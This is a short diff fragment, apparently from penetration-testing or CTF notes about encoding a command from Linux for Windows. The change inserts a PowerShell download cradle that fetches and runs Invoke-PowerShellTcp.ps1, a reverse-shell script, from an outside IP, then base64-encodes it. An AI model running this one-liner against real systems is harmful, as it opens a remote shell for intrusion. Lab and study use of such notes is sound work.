@@ -25,7 +25,7 @@ tasklist /v |findstr -i cloudme
  <summary><strong>Linux to Windows encoding</strong></summary>
 
 ```bash
-echo -n <code> | iconv --to-code UTF-16LE | base64 -w0
+echo -n iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1') | iconv --to-code UTF-16LE | base64 -w0
 ```
  
 </details>
